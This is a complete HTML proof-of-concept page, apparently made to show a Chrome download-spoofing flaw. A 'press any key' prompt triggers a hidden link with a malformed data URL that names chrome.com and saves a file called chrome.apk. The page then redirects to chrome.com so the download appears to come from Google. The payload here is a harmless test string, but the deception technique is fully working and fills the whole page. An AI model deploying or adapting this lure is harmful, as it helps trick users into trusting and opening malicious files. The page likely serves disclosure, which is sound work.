<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Chrome Download PoC</title>
  <style>
    body {
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: sans-serif;
      font-size: 22px;
    }
  </style>
</head>

<body>

<p>Press any key to continue</p>

<script>
window.addEventListener('keydown', function () {

  // Trigger download (malformed data URL)
  const a = document.createElement("a");
  a.href = "data://chrome.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
  a.download = "chrome.apk";
  document.body.appendChild(a);
  a.click();
  a.remove();

  // Redirect after download toast
  setTimeout(() => {
    window.location.href = "https://chrome.com";
  }, 350);

}, { once: true });
</script>

</body>
</html>
